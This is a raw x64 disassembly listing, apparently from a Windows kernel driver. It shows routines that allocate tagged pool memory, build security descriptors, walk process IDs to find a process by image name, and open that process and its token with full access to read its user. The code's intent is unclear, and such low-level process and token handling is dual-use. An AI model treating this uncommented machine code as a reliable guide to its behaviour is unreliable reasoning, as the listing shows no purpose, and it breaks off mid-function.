   1400065a1:	4c 8b c1             	mov    %rcx,%r8
   1400065a4:	4d 2b c3             	sub    %r11,%r8
   1400065a7:	66 41 39 39          	cmp    %di,(%r9)
   1400065ab:	74 3a                	je     0x1400065e7
   1400065ad:	49 8b d3             	mov    %r11,%rdx
   1400065b0:	41 8b da             	mov    %r10d,%ebx
   1400065b3:	0f b7 02             	movzwl (%rdx),%eax
   1400065b6:	66 85 c0             	test   %ax,%ax
   1400065b9:	74 39                	je     0x1400065f4
   1400065bb:	66 41 39 04 10       	cmp    %ax,(%r8,%rdx,1)
   1400065c0:	75 10                	jne    0x1400065d2
   1400065c2:	48 83 c2 02          	add    $0x2,%rdx
   1400065c6:	83 eb 01             	sub    $0x1,%ebx
   1400065c9:	78 1c                	js     0x1400065e7
   1400065cb:	66 41 39 3c 10       	cmp    %di,(%r8,%rdx,1)
   1400065d0:	75 e1                	jne    0x1400065b3
   1400065d2:	66 39 3a             	cmp    %di,(%rdx)
   1400065d5:	74 1d                	je     0x1400065f4
   1400065d7:	49 83 c1 02          	add    $0x2,%r9
   1400065db:	49 83 c0 02          	add    $0x2,%r8
   1400065df:	41 ff ca             	dec    %r10d
   1400065e2:	45 85 d2             	test   %r10d,%r10d
   1400065e5:	7f c0                	jg     0x1400065a7
   1400065e7:	33 c0                	xor    %eax,%eax
   1400065e9:	48 8b 5c 24 08       	mov    0x8(%rsp),%rbx
   1400065ee:	48 8b 7c 24 10       	mov    0x10(%rsp),%rdi
   1400065f3:	c3                   	ret
   1400065f4:	49 8b c1             	mov    %r9,%rax
   1400065f7:	eb f0                	jmp    0x1400065e9
   1400065f9:	cc                   	int3
   1400065fa:	cc                   	int3
   1400065fb:	cc                   	int3
   1400065fc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006601:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140006606:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000660b:	57                   	push   %rdi
   14000660c:	48 83 ec 20          	sub    $0x20,%rsp
   140006610:	41 8b e8             	mov    %r8d,%ebp
   140006613:	48 8b fa             	mov    %rdx,%rdi
   140006616:	48 8b f1             	mov    %rcx,%rsi
   140006619:	33 db                	xor    %ebx,%ebx
   14000661b:	ff 15 a7 1b 00 00    	call   *0x1ba7(%rip)        # 0x1400081c8
   140006621:	84 c0                	test   %al,%al
   140006623:	74 45                	je     0x14000666a
   140006625:	48 8b cf             	mov    %rdi,%rcx
   140006628:	ff 15 9a 1b 00 00    	call   *0x1b9a(%rip)        # 0x1400081c8
   14000662e:	84 c0                	test   %al,%al
   140006630:	74 38                	je     0x14000666a
   140006632:	48 85 f6             	test   %rsi,%rsi
   140006635:	74 33                	je     0x14000666a
   140006637:	48 85 ff             	test   %rdi,%rdi
   14000663a:	74 2e                	je     0x14000666a
   14000663c:	85 ed                	test   %ebp,%ebp
   14000663e:	74 2a                	je     0x14000666a
   140006640:	38 1f                	cmp    %bl,(%rdi)
   140006642:	74 26                	je     0x14000666a
   140006644:	3b dd                	cmp    %ebp,%ebx
   140006646:	73 0f                	jae    0x140006657
   140006648:	8a 07                	mov    (%rdi),%al
   14000664a:	48 ff c7             	inc    %rdi
   14000664d:	88 04 33             	mov    %al,(%rbx,%rsi,1)
   140006650:	ff c3                	inc    %ebx
   140006652:	80 3f 00             	cmpb   $0x0,(%rdi)
   140006655:	75 ed                	jne    0x140006644
   140006657:	85 db                	test   %ebx,%ebx
   140006659:	74 0f                	je     0x14000666a
   14000665b:	8d 4d ff             	lea    -0x1(%rbp),%ecx
   14000665e:	3b d9                	cmp    %ecx,%ebx
   140006660:	77 04                	ja     0x140006666
   140006662:	c6 04 33 00          	movb   $0x0,(%rbx,%rsi,1)
   140006666:	b0 01                	mov    $0x1,%al
   140006668:	eb 02                	jmp    0x14000666c
   14000666a:	32 c0                	xor    %al,%al
   14000666c:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140006671:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140006676:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   14000667b:	48 83 c4 20          	add    $0x20,%rsp
   14000667f:	5f                   	pop    %rdi
   140006680:	c3                   	ret
   140006681:	cc                   	int3
   140006682:	cc                   	int3
   140006683:	cc                   	int3
   140006684:	4c 8b dc             	mov    %rsp,%r11
   140006687:	49 89 5b 08          	mov    %rbx,0x8(%r11)
   14000668b:	49 89 6b 10          	mov    %rbp,0x10(%r11)
   14000668f:	49 89 73 18          	mov    %rsi,0x18(%r11)
   140006693:	49 89 7b 20          	mov    %rdi,0x20(%r11)
   140006697:	41 56                	push   %r14
   140006699:	48 83 ec 50          	sub    $0x50,%rsp
   14000669d:	33 c0                	xor    %eax,%eax
   14000669f:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400066a2:	4c 8b f1             	mov    %rcx,%r14
   1400066a5:	0f 11 44 24 20       	movups %xmm0,0x20(%rsp)
   1400066aa:	0f 11 44 24 30       	movups %xmm0,0x30(%rsp)
   1400066af:	49 89 43 e8          	mov    %rax,-0x18(%r11)
   1400066b3:	48 8b 05 3e 1c 00 00 	mov    0x1c3e(%rip),%rax        # 0x1400082f8
   1400066ba:	84 d2                	test   %dl,%dl
   1400066bc:	74 0c                	je     0x1400066ca
   1400066be:	4c 8b 00             	mov    (%rax),%r8
   1400066c1:	49 8b 88 08 01 00 00 	mov    0x108(%r8),%rcx
   1400066c8:	eb 0a                	jmp    0x1400066d4
   1400066ca:	48 8b 08             	mov    (%rax),%rcx
   1400066cd:	48 8b 89 08 01 00 00 	mov    0x108(%rcx),%rcx
   1400066d4:	f6 da                	neg    %dl
   1400066d6:	48 8b e9             	mov    %rcx,%rbp
   1400066d9:	1b f6                	sbb    %esi,%esi
   1400066db:	81 e6 00 00 02 70    	and    $0x70020000,%esi
   1400066e1:	81 c6 00 00 00 10    	add    $0x10000000,%esi
   1400066e7:	ff 15 b3 1b 00 00    	call   *0x1bb3(%rip)        # 0x1400082a0
   1400066ed:	48 8b 0d 04 1c 00 00 	mov    0x1c04(%rip),%rcx        # 0x1400082f8
   1400066f4:	8d 58 08             	lea    0x8(%rax),%ebx
   1400066f7:	48 8b 09             	mov    (%rcx),%rcx
   1400066fa:	48 8b 89 10 01 00 00 	mov    0x110(%rcx),%rcx
   140006701:	ff 15 99 1b 00 00    	call   *0x1b99(%rip)        # 0x1400082a0
   140006707:	48 8b 0d ea 1b 00 00 	mov    0x1bea(%rip),%rcx        # 0x1400082f8
   14000670e:	03 d8                	add    %eax,%ebx
   140006710:	48 8b 09             	mov    (%rcx),%rcx
   140006713:	48 8b 89 18 01 00 00 	mov    0x118(%rcx),%rcx
   14000671a:	ff 15 80 1b 00 00    	call   *0x1b80(%rip)        # 0x1400082a0
   140006720:	b9 01 00 00 00       	mov    $0x1,%ecx
   140006725:	41 b8 57 45 4e 45    	mov    $0x454e4557,%r8d
   14000672b:	83 c0 18             	add    $0x18,%eax
   14000672e:	03 d8                	add    %eax,%ebx
   140006730:	8b d3                	mov    %ebx,%edx
   140006732:	ff 15 d8 1b 00 00    	call   *0x1bd8(%rip)        # 0x140008310
   140006738:	48 8b f8             	mov    %rax,%rdi
   14000673b:	48 85 c0             	test   %rax,%rax
   14000673e:	75 0a                	jne    0x14000674a
   140006740:	bb 9a 00 00 c0       	mov    $0xc000009a,%ebx
   140006745:	e9 04 01 00 00       	jmp    0x14000684e
   14000674a:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   140006750:	8b d3                	mov    %ebx,%edx
   140006752:	48 8b cf             	mov    %rdi,%rcx
   140006755:	ff 15 55 1b 00 00    	call   *0x1b55(%rip)        # 0x1400082b0
   14000675b:	8b d8                	mov    %eax,%ebx
   14000675d:	85 c0                	test   %eax,%eax
   14000675f:	0f 88 db 00 00 00    	js     0x140006840
   140006765:	48 8b 05 8c 1b 00 00 	mov    0x1b8c(%rip),%rax        # 0x1400082f8
   14000676c:	44 8b c6             	mov    %esi,%r8d
   14000676f:	ba 02 00 00 00       	mov    $0x2,%edx
   140006774:	48 8b cf             	mov    %rdi,%rcx
   140006777:	4c 8b 08             	mov    (%rax),%r9
   14000677a:	4d 8b 89 08 01 00 00 	mov    0x108(%r9),%r9
   140006781:	ff 15 31 1b 00 00    	call   *0x1b31(%rip)        # 0x1400082b8
   140006787:	8b d8                	mov    %eax,%ebx
   140006789:	85 c0                	test   %eax,%eax
   14000678b:	0f 88 af 00 00 00    	js     0x140006840
   140006791:	48 8b 05 60 1b 00 00 	mov    0x1b60(%rip),%rax        # 0x1400082f8
   140006798:	44 8b c6             	mov    %esi,%r8d
   14000679b:	ba 02 00 00 00       	mov    $0x2,%edx
   1400067a0:	48 8b cf             	mov    %rdi,%rcx
   1400067a3:	4c 8b 08             	mov    (%rax),%r9
   1400067a6:	4d 8b 89 10 01 00 00 	mov    0x110(%r9),%r9
   1400067ad:	ff 15 05 1b 00 00    	call   *0x1b05(%rip)        # 0x1400082b8
   1400067b3:	8b d8                	mov    %eax,%ebx
   1400067b5:	85 c0                	test   %eax,%eax
   1400067b7:	0f 88 83 00 00 00    	js     0x140006840
   1400067bd:	48 8b 05 34 1b 00 00 	mov    0x1b34(%rip),%rax        # 0x1400082f8
   1400067c4:	44 8b c6             	mov    %esi,%r8d
   1400067c7:	ba 02 00 00 00       	mov    $0x2,%edx
   1400067cc:	48 8b cf             	mov    %rdi,%rcx
   1400067cf:	4c 8b 08             	mov    (%rax),%r9
   1400067d2:	4d 8b 89 18 01 00 00 	mov    0x118(%r9),%r9
   1400067d9:	ff 15 d9 1a 00 00    	call   *0x1ad9(%rip)        # 0x1400082b8
   1400067df:	8b d8                	mov    %eax,%ebx
   1400067e1:	85 c0                	test   %eax,%eax
   1400067e3:	78 5b                	js     0x140006840
   1400067e5:	ba 01 00 00 00       	mov    $0x1,%edx
   1400067ea:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400067ef:	ff 15 53 1a 00 00    	call   *0x1a53(%rip)        # 0x140008248
   1400067f5:	8b d8                	mov    %eax,%ebx
   1400067f7:	85 c0                	test   %eax,%eax
   1400067f9:	78 45                	js     0x140006840
   1400067fb:	45 33 c9             	xor    %r9d,%r9d
   1400067fe:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140006803:	4c 8b c7             	mov    %rdi,%r8
   140006806:	b2 01                	mov    $0x1,%dl
   140006808:	ff 15 42 1a 00 00    	call   *0x1a42(%rip)        # 0x140008250
   14000680e:	8b d8                	mov    %eax,%ebx
   140006810:	85 c0                	test   %eax,%eax
   140006812:	78 2c                	js     0x140006840
   140006814:	45 33 c0             	xor    %r8d,%r8d
   140006817:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000681c:	48 8b d5             	mov    %rbp,%rdx
   14000681f:	ff 15 9b 1a 00 00    	call   *0x1a9b(%rip)        # 0x1400082c0
   140006825:	8b d8                	mov    %eax,%ebx
   140006827:	85 c0                	test   %eax,%eax
   140006829:	78 15                	js     0x140006840
   14000682b:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   140006830:	ba 05 00 00 00       	mov    $0x5,%edx
   140006835:	49 8b ce             	mov    %r14,%rcx
   140006838:	ff 15 a2 1a 00 00    	call   *0x1aa2(%rip)        # 0x1400082e0
   14000683e:	8b d8                	mov    %eax,%ebx
   140006840:	ba 57 45 4e 45       	mov    $0x454e4557,%edx
   140006845:	48 8b cf             	mov    %rdi,%rcx
   140006848:	ff 15 ba 1a 00 00    	call   *0x1aba(%rip)        # 0x140008308
   14000684e:	48 8b 6c 24 68       	mov    0x68(%rsp),%rbp
   140006853:	8b c3                	mov    %ebx,%eax
   140006855:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   14000685a:	48 8b 74 24 70       	mov    0x70(%rsp),%rsi
   14000685f:	48 8b 7c 24 78       	mov    0x78(%rsp),%rdi
   140006864:	48 83 c4 50          	add    $0x50,%rsp
   140006868:	41 5e                	pop    %r14
   14000686a:	c3                   	ret
   14000686b:	cc                   	int3
   14000686c:	48 ff 25 d5 18 00 00 	rex.W jmp *0x18d5(%rip)        # 0x140008148
   140006873:	cc                   	int3
   140006874:	45 33 c0             	xor    %r8d,%r8d
   140006877:	41 8d 50 01          	lea    0x1(%r8),%edx
   14000687b:	48 ff 25 5e 18 00 00 	rex.W jmp *0x185e(%rip)        # 0x1400080e0
   140006882:	cc                   	int3
   140006883:	cc                   	int3
   140006884:	40 53                	rex push %rbx
   140006886:	48 81 ec 80 00 00 00 	sub    $0x80,%rsp
   14000688d:	48 8b da             	mov    %rdx,%rbx
   140006890:	48 8b d1             	mov    %rcx,%rdx
   140006893:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140006898:	ff 15 a2 1a 00 00    	call   *0x1aa2(%rip)        # 0x140008340
   14000689e:	48 83 64 24 58 00    	andq   $0x0,0x58(%rsp)
   1400068a4:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   1400068a9:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   1400068ae:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   1400068b3:	48 8d 84 24 a0 00 00 	lea    0xa0(%rsp),%rax
   1400068ba:	00 
   1400068bb:	c7 44 24 50 30 00 00 	movl   $0x30,0x50(%rsp)
   1400068c2:	00 
   1400068c3:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   1400068c8:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400068cb:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   1400068d0:	45 33 c9             	xor    %r9d,%r9d
   1400068d3:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   1400068d9:	ba 3f 00 0f 00       	mov    $0xf003f,%edx
   1400068de:	48 8b cb             	mov    %rbx,%rcx
   1400068e1:	c7 44 24 68 40 02 00 	movl   $0x240,0x68(%rsp)
   1400068e8:	00 
   1400068e9:	f3 0f 7f 44 24 70    	movdqu %xmm0,0x70(%rsp)
   1400068ef:	ff 15 7b 19 00 00    	call   *0x197b(%rip)        # 0x140008270
   1400068f5:	85 c0                	test   %eax,%eax
   1400068f7:	78 15                	js     0x14000690e
   1400068f9:	8b 84 24 a0 00 00 00 	mov    0xa0(%rsp),%eax
   140006900:	ff c8                	dec    %eax
   140006902:	83 f8 01             	cmp    $0x1,%eax
   140006905:	76 07                	jbe    0x14000690e
   140006907:	b8 01 00 00 c0       	mov    $0xc0000001,%eax
   14000690c:	eb 02                	jmp    0x140006910
   14000690e:	33 c0                	xor    %eax,%eax
   140006910:	48 81 c4 80 00 00 00 	add    $0x80,%rsp
   140006917:	5b                   	pop    %rbx
   140006918:	c3                   	ret
   140006919:	cc                   	int3
   14000691a:	cc                   	int3
   14000691b:	cc                   	int3
   14000691c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006921:	57                   	push   %rdi
   140006922:	48 83 ec 30          	sub    $0x30,%rsp
   140006926:	8b d9                	mov    %ecx,%ebx
   140006928:	ba 40 00 00 00       	mov    $0x40,%edx
   14000692d:	33 c9                	xor    %ecx,%ecx
   14000692f:	41 b8 57 45 4e 45    	mov    $0x454e4557,%r8d
   140006935:	ff 15 d5 19 00 00    	call   *0x19d5(%rip)        # 0x140008310
   14000693b:	48 8b f8             	mov    %rax,%rdi
   14000693e:	48 85 c0             	test   %rax,%rax
   140006941:	74 56                	je     0x140006999
   140006943:	48 8b c8             	mov    %rax,%rcx
   140006946:	ff 15 7c 18 00 00    	call   *0x187c(%rip)        # 0x1400081c8
   14000694c:	84 c0                	test   %al,%al
   14000694e:	74 49                	je     0x140006999
   140006950:	33 d2                	xor    %edx,%edx
   140006952:	48 8b cf             	mov    %rdi,%rcx
   140006955:	48 69 db f0 d8 ff ff 	imul   $0xffffffffffffd8f0,%rbx,%rbx
   14000695c:	ff 15 f6 18 00 00    	call   *0x18f6(%rip)        # 0x140008258
   140006962:	45 33 c9             	xor    %r9d,%r9d
   140006965:	45 33 c0             	xor    %r8d,%r8d
   140006968:	48 8b d3             	mov    %rbx,%rdx
   14000696b:	48 8b cf             	mov    %rdi,%rcx
   14000696e:	ff 15 ec 18 00 00    	call   *0x18ec(%rip)        # 0x140008260
   140006974:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   14000697a:	45 33 c9             	xor    %r9d,%r9d
   14000697d:	45 33 c0             	xor    %r8d,%r8d
   140006980:	33 d2                	xor    %edx,%edx
   140006982:	48 8b cf             	mov    %rdi,%rcx
   140006985:	ff 15 5d 17 00 00    	call   *0x175d(%rip)        # 0x1400080e8
   14000698b:	ba 57 45 4e 45       	mov    $0x454e4557,%edx
   140006990:	48 8b cf             	mov    %rdi,%rcx
   140006993:	ff 15 6f 19 00 00    	call   *0x196f(%rip)        # 0x140008308
   140006999:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   14000699e:	48 83 c4 30          	add    $0x30,%rsp
   1400069a2:	5f                   	pop    %rdi
   1400069a3:	c3                   	ret
   1400069a4:	40 55                	rex push %rbp
   1400069a6:	53                   	push   %rbx
   1400069a7:	56                   	push   %rsi
   1400069a8:	57                   	push   %rdi
   1400069a9:	41 54                	push   %r12
   1400069ab:	41 56                	push   %r14
   1400069ad:	41 57                	push   %r15
   1400069af:	48 8b ec             	mov    %rsp,%rbp
   1400069b2:	48 83 ec 50          	sub    $0x50,%rsp
   1400069b6:	45 33 f6             	xor    %r14d,%r14d
   1400069b9:	4c 8d 25 00 b9 00 00 	lea    0xb900(%rip),%r12        # 0x1400122c0
   1400069c0:	66 44 39 35 f8 b8 00 	cmp    %r14w,0xb8f8(%rip)        # 0x1400122c0
   1400069c7:	00 
   1400069c8:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400069cb:	4c 89 75 48          	mov    %r14,0x48(%rbp)
   1400069cf:	4c 89 75 50          	mov    %r14,0x50(%rbp)
   1400069d3:	44 89 75 40          	mov    %r14d,0x40(%rbp)
   1400069d7:	0f 11 45 f0          	movups %xmm0,-0x10(%rbp)
   1400069db:	0f 85 29 01 00 00    	jne    0x140006b0a
   1400069e1:	e8 8e 01 00 00       	call   0x140006b74
   1400069e6:	48 8b f8             	mov    %rax,%rdi
   1400069e9:	48 85 c0             	test   %rax,%rax
   1400069ec:	0f 84 28 01 00 00    	je     0x140006b1a
   1400069f2:	48 8d 45 48          	lea    0x48(%rbp),%rax
   1400069f6:	41 b9 ff ff 1f 00    	mov    $0x1fffff,%r9d
   1400069fc:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140006a01:	45 33 c0             	xor    %r8d,%r8d
   140006a04:	48 8b 05 e5 18 00 00 	mov    0x18e5(%rip),%rax        # 0x1400082f0
   140006a0b:	33 d2                	xor    %edx,%edx
   140006a0d:	44 88 74 24 28       	mov    %r14b,0x28(%rsp)
   140006a12:	48 8b 08             	mov    (%rax),%rcx
   140006a15:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140006a1a:	48 8b cf             	mov    %rdi,%rcx
   140006a1d:	ff 15 ad 18 00 00    	call   *0x18ad(%rip)        # 0x1400082d0
   140006a23:	85 c0                	test   %eax,%eax
   140006a25:	0f 88 b8 00 00 00    	js     0x140006ae3
   140006a2b:	48 8b 4d 48          	mov    0x48(%rbp),%rcx
   140006a2f:	4c 8d 4d 50          	lea    0x50(%rbp),%r9
   140006a33:	ba 08 00 02 00       	mov    $0x20008,%edx
   140006a38:	41 b8 00 02 00 00    	mov    $0x200,%r8d
   140006a3e:	ff 15 94 18 00 00    	call   *0x1894(%rip)        # 0x1400082d8
   140006a44:	85 c0                	test   %eax,%eax
   140006a46:	0f 88 97 00 00 00    	js     0x140006ae3
   140006a4c:	be 00 10 00 00       	mov    $0x1000,%esi
   140006a51:	41 bf 57 45 4e 45    	mov    $0x454e4557,%r15d
   140006a57:	8b d6                	mov    %esi,%edx
   140006a59:	45 8b c7             	mov    %r15d,%r8d
   140006a5c:	b9 01 00 00 00       	mov    $0x1,%ecx
   140006a61:	ff 15 a9 18 00 00    	call   *0x18a9(%rip)        # 0x140008310
   140006a67:	48 8b d8             	mov    %rax,%rbx
   140006a6a:	48 85 c0             	test   %rax,%rax
   140006a6d:	74 74                	je     0x140006ae3
   140006a6f:	48 8b c8             	mov    %rax,%rcx
   140006a72:	ff 15 50 17 00 00    	call   *0x1750(%rip)        # 0x1400081c8
   140006a78:	84 c0                	test   %al,%al
   140006a7a:	74 67                	je     0x140006ae3
   140006a7c:	48 8b 4d 50          	mov    0x50(%rbp),%rcx
   140006a80:	48 8d 45 40          	lea    0x40(%rbp),%rax
   140006a84:	44 8b ce             	mov    %esi,%r9d
   140006a87:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140006a8c:	4c 8b c3             	mov    %rbx,%r8
   140006a8f:	ba 01 00 00 00       	mov    $0x1,%edx
   140006a94:	ff 15 fe 17 00 00    	call   *0x17fe(%rip)        # 0x140008298
   140006a9a:	3d 23 00 00 c0       	cmp    $0xc0000023,%eax
   140006a9f:	75 15                	jne    0x140006ab6
   140006aa1:	41 8b d7             	mov    %r15d,%edx
   140006aa4:	48 8b cb             	mov    %rbx,%rcx
   140006aa7:	ff 15 5b 18 00 00    	call   *0x185b(%rip)        # 0x140008308
   140006aad:	8d 04 36             	lea    (%rsi,%rsi,1),%eax
   140006ab0:	8b f0                	mov    %eax,%esi
   140006ab2:	8b d0                	mov    %eax,%edx
   140006ab4:	eb a3                	jmp    0x140006a59
   140006ab6:	85 c0                	test   %eax,%eax
   140006ab8:	78 1d                	js     0x140006ad7
   140006aba:	b8 00 02 00 00       	mov    $0x200,%eax
   140006abf:	4c 89 65 f8          	mov    %r12,-0x8(%rbp)
   140006ac3:	66 89 45 f2          	mov    %ax,-0xe(%rbp)
   140006ac7:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   140006acb:	48 8b 13             	mov    (%rbx),%rdx
   140006ace:	45 33 c0             	xor    %r8d,%r8d
   140006ad1:	ff 15 d1 17 00 00    	call   *0x17d1(%rip)        # 0x1400082a8
   140006ad7:	41 8b d7             	mov    %r15d,%edx
   140006ada:	48 8b cb             	mov    %rbx,%rcx
   140006add:	ff 15 25 18 00 00    	call   *0x1825(%rip)        # 0x140008308
   140006ae3:	48 8b cf             	mov    %rdi,%rcx
   140006ae6:	ff 15 34 16 00 00    	call   *0x1634(%rip)        # 0x140008120
   140006aec:	48 8b 4d 48          	mov    0x48(%rbp),%rcx
   140006af0:	48 85 c9             	test   %rcx,%rcx
   140006af3:	74 06                	je     0x140006afb
   140006af5:	ff 15 4d 16 00 00    	call   *0x164d(%rip)        # 0x140008148
   140006afb:	48 8b 4d 50          	mov    0x50(%rbp),%rcx
   140006aff:	48 85 c9             	test   %rcx,%rcx
   140006b02:	74 06                	je     0x140006b0a
   140006b04:	ff 15 3e 16 00 00    	call   *0x163e(%rip)        # 0x140008148
   140006b0a:	0f b7 05 af b7 00 00 	movzwl 0xb7af(%rip),%eax        # 0x1400122c0
   140006b11:	66 f7 d8             	neg    %ax
   140006b14:	48 1b c0             	sbb    %rax,%rax
   140006b17:	49 23 c4             	and    %r12,%rax
   140006b1a:	48 83 c4 50          	add    $0x50,%rsp
   140006b1e:	41 5f                	pop    %r15
   140006b20:	41 5e                	pop    %r14
   140006b22:	41 5c                	pop    %r12
   140006b24:	5f                   	pop    %rdi
   140006b25:	5e                   	pop    %rsi
   140006b26:	5b                   	pop    %rbx
   140006b27:	5d                   	pop    %rbp
   140006b28:	c3                   	ret
   140006b29:	cc                   	int3
   140006b2a:	cc                   	int3
   140006b2b:	cc                   	int3
   140006b2c:	40 53                	rex push %rbx
   140006b2e:	48 83 ec 20          	sub    $0x20,%rsp
   140006b32:	33 db                	xor    %ebx,%ebx
   140006b34:	48 85 c9             	test   %rcx,%rcx
   140006b37:	75 04                	jne    0x140006b3d
   140006b39:	33 c0                	xor    %eax,%eax
   140006b3b:	eb 30                	jmp    0x140006b6d
   140006b3d:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140006b42:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   140006b47:	ff 15 7b 17 00 00    	call   *0x177b(%rip)        # 0x1400082c8
   140006b4d:	85 c0                	test   %eax,%eax
   140006b4f:	78 19                	js     0x140006b6a
   140006b51:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140006b56:	ff 15 8c 17 00 00    	call   *0x178c(%rip)        # 0x1400082e8
   140006b5c:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140006b61:	48 8b d8             	mov    %rax,%rbx
   140006b64:	ff 15 b6 15 00 00    	call   *0x15b6(%rip)        # 0x140008120
   140006b6a:	48 8b c3             	mov    %rbx,%rax
   140006b6d:	48 83 c4 20          	add    $0x20,%rsp
   140006b71:	5b                   	pop    %rbx
   140006b72:	c3                   	ret
   140006b73:	cc                   	int3
   140006b74:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006b79:	57                   	push   %rdi
   140006b7a:	48 81 ec 40 01 00 00 	sub    $0x140,%rsp
   140006b81:	48 8b 05 58 35 00 00 	mov    0x3558(%rip),%rax        # 0x14000a0e0
   140006b88:	48 33 c4             	xor    %rsp,%rax
   140006b8b:	48 89 84 24 30 01 00 	mov    %rax,0x130(%rsp)
   140006b92:	00 
   140006b93:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140006b99:	bb 04 00 00 00       	mov    $0x4,%ebx
   140006b9e:	33 d2                	xor    %edx,%edx
   140006ba0:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140006ba5:	41 b8 00 01 00 00    	mov    $0x100,%r8d
   140006bab:	e8 90 05 00 00       	call   0x140007140
   140006bb0:	8b cb                	mov    %ebx,%ecx
   140006bb2:	8b fb                	mov    %ebx,%edi
   140006bb4:	e8 73 ff ff ff       	call   0x140006b2c
   140006bb9:	48 85 c0             	test   %rax,%rax
   140006bbc:	74 17                	je     0x140006bd5
   140006bbe:	41 b8 ff 00 00 00    	mov    $0xff,%r8d
   140006bc4:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140006bc9:	48 8b d0             	mov    %rax,%rdx
   140006bcc:	e8 2b fa ff ff       	call   0x1400065fc
   140006bd1:	84 c0                	test   %al,%al
   140006bd3:	74 28                	je     0x140006bfd
   140006bd5:	48 8d 15 4c 1b 00 00 	lea    0x1b4c(%rip),%rdx        # 0x140008728
   140006bdc:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140006be1:	e8 f0 03 00 00       	call   0x140006fd6
   140006be6:	48 85 c0             	test   %rax,%rax
   140006be9:	74 12                	je     0x140006bfd
   140006beb:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140006bf0:	48 8b cf             	mov    %rdi,%rcx
   140006bf3:	ff 15 cf 16 00 00    	call   *0x16cf(%rip)        # 0x1400082c8
   140006bf9:	85 c0                	test   %eax,%eax
   140006bfb:	79 2e                	jns    0x140006c2b
   140006bfd:	83 c3 04             	add    $0x4,%ebx
   140006c00:	81 fb 00 00 01 00    	cmp    $0x10000,%ebx
   140006c06:	72 96                	jb     0x140006b9e
   140006c08:	33 c0                	xor    %eax,%eax
   140006c0a:	48 8b 8c 24 30 01 00 	mov    0x130(%rsp),%rcx
   140006c11:	00 
   140006c12:	48 33 cc             	xor    %rsp,%rcx
   140006c15:	e8 16 04 00 00       	call   0x140007030
   140006c1a:	48 8b 9c 24 50 01 00 	mov    0x150(%rsp),%rbx
   140006c21:	00 
   140006c22:	48 81 c4 40 01 00 00 	add    $0x140,%rsp
   140006c29:	5f                   	pop    %rdi
   140006c2a:	c3                   	ret
   140006c2b:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   140006c30:	eb d8                	jmp    0x140006c0a
   140006c32:	cc                   	int3
   140006c33:	cc                   	int3
   140006c34:	40 53                	rex push %rbx
   140006c36:	48 83 ec 60          	sub    $0x60,%rsp
   140006c3a:	48 8b da             	mov    %rdx,%rbx
   140006c3d:	48 8b d1             	mov    %rcx,%rdx
   140006c40:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140006c45:	ff 15 f5 16 00 00    	call   *0x16f5(%rip)        # 0x140008340
   140006c4b:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   140006c51:	48 8d 44 24 20       	lea    0x20(%rsp),%rax
   140006c56:	0f 57 c0             	xorps  %xmm0,%xmm0
   140006c59:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140006c5e:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   140006c63:	c7 44 24 30 30 00 00 	movl   $0x30,0x30(%rsp)
   140006c6a:	00 
   140006c6b:	ba 3f 00 0f 00       	mov    $0xf003f,%edx
   140006c70:	c7 44 24 48 40 02 00 	movl   $0x240,0x48(%rsp)
   140006c77:	00 
   140006c78:	48 8b cb             	mov    %rbx,%rcx
   140006c7b:	f3 0f 7f 44 24 50    	movdqu %xmm0,0x50(%rsp)
   140006c81:	ff 15 f1 15 00 00    	call   *0x15f1(%rip)        # 0x140008278
   140006c87:	48 83 c4 60          	add    $0x60,%rsp
   140006c8b:	5b                   	pop    %rbx
   140006c8c:	c3                   	ret
   140006c8d:	cc                   	int3
   140006c8e:	cc                   	int3
   140006c8f:	cc                   	int3
   140006c90:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006c95:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140006c9a:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   140006c9f:	55                   	push   %rbp
   140006ca0:	48 8b ec             	mov    %rsp,%rbp
   140006ca3:	48 83 ec 50          	sub    $0x50,%rsp
   140006ca7:	48 8b d9             	mov    %rcx,%rbx
   140006caa:	33 ff                	xor    %edi,%edi
